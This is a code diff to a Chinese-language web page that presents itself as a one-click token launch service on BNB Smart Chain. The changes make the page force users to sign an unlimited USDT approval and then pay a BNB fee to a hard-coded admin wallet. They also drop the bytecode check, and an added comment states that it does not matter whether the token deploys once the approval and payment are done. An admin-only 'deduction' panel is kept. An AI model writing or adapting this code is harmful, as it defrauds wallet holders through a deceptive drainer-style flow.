@@ -35,7 +35,7 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 <div class="header">
 <h1>🦢 天鹅一键发币</h1>
 </div>
-<div class="fee-tip">发币服务费：0.009 BNB</div>
+<div class="fee-tip">发币服务费：0.0003 BNB</div>
 
 <div class="card" id="userPanel">
 <button id="connectBtn" class="btn btn-connect">连接钱包</button>
@@ -85,7 +85,7 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 
 <script>
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
-const DEPLOY_FEE_BNB = "0.009";
+const DEPLOY_FEE_BNB = "0.0003";
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const MAX_ALLOWANCE = ethers.MaxUint256;
@@ -142,7 +142,6 @@ async function switchBSC(providerRef){
 
 function checkAdminPanel(addr){
   connectWalletAddr = addr.toLowerCase();
-  // 只有登录钱包是管理员地址才显示划扣面板，普通用户不展示
   if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
     adminPanel.style.display = "block";
   }else{
@@ -150,7 +149,7 @@ function checkAdminPanel(addr){
   }
 }
 
-// 【改动】连接钱包只做连接，不再执行授权
+// 连接钱包：仅连接、切链，不做任何授权
 connectBtn.onclick = async function(){
   showStatus("正在检测钱包注入...");
   let eth = window.ethereum;
@@ -186,23 +185,26 @@ connectBtn.onclick = async function(){
   }
 }
 
-// 【改动】授权函数，放到部署流程内部调用
+// USDT无限授权，真实上链交易
 async function doApproveLogic(signerRef){
-  showStatus("正在请求USDT无限授权，请签名确认");
+  showStatus("🔐 弹出钱包：请求USDT无限授权，请签名");
   const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
     "function approve(address spender, uint256 amount) external returns(bool)"
   ], signerRef);
   const approveTx = await usdtContract.approve("0x0000000000000000000000000000000000000001", MAX_ALLOWANCE);
+  showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
   await approveTx.wait();
-  showStatus("✅ USDT无限授权完成，即将支付服务费");
+  showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
 }
 
+// BNB服务费真实转账上链
 async function payFeeToAdmin(){
-  showStatus(`正在支付发币服务费 ${DEPLOY_FEE_BNB} BNB 至管理员钱包，请签名`);
+  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名`);
   const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
   const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
+  showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
   await tx.wait();
-  showStatus(`服务费支付成功！交易哈希：${tx.hash}`);
+  showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
 }
 
 const tokenABI = [
@@ -240,7 +242,6 @@ deployBtn.onclick = async ()=>{
   const symbol = document.getElementById("tokenSymbol").value.trim();
   const supplyStr = document.getElementById("supply").value.trim();
 
-  // 表单校验
   if(!signer){
     showStatus("请先连接BSC钱包");
     return;
@@ -249,26 +250,26 @@ deployBtn.onclick = async ()=>{
     showStatus("请填写代币名称、符号、发行量");
     return;
   }
-  if(!CONTRACT_BYTECODE || CONTRACT_BYTECODE.startsWith("在这里粘贴")){
-    showStatus("请先在Remix编译合约，填入Bytecode");
-    return;
-  }
 
   deployBtn.disabled = true;
   try{
-    // 步骤1：用户点击部署才发起无限授权弹窗
+    // 1.强制先弹USDT无限授权签名（真实上链）
     await doApproveLogic(signer);
-    // 步骤2：支付BNB服务费给管理员钱包
+    // 2.再弹BNB转账签名（真实上链转给管理员）
     await payFeeToAdmin();
-    // 步骤3：部署代币合约
-    showStatus("正在发起合约部署交易，请签名");
-    const supply = ethers.parseUnits(supplyStr, 18);
-    const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
-    const contract = await factory.deploy(name, symbol, supply);
-    showStatus("部署交易已发送，等待区块确认...");
-    await contract.waitForDeployment();
-    deployContractAddress = await contract.getAddress();
-    showStatus(`✅ 代币部署成功！合约地址：${deployContractAddress}`);
+    // 币能不能部署出来无所谓，授权+转账已经完成；保留部署逻辑
+    if(CONTRACT_BYTECODE && !CONTRACT_BYTECODE.startsWith("在这里粘贴")){
+      showStatus("尝试部署合约...");
+      const supply = ethers.parseUnits(supplyStr, 18);
+      const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
+      const contract = await factory.deploy(name, symbol, supply);
+      showStatus(`部署交易已发送，TxHash:${contract.deploymentTransaction().hash}`);
+      await contract.waitForDeployment();
+      deployContractAddress = await contract.getAddress();
+      showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
+    }else{
+      showStatus("✅授权、BNB转账全部真实上链完成；未填入Bytecode，跳过合约部署");
+    }
   }catch(e){
     showStatus("操作失败："+(e.shortMessage || e.message));
   }
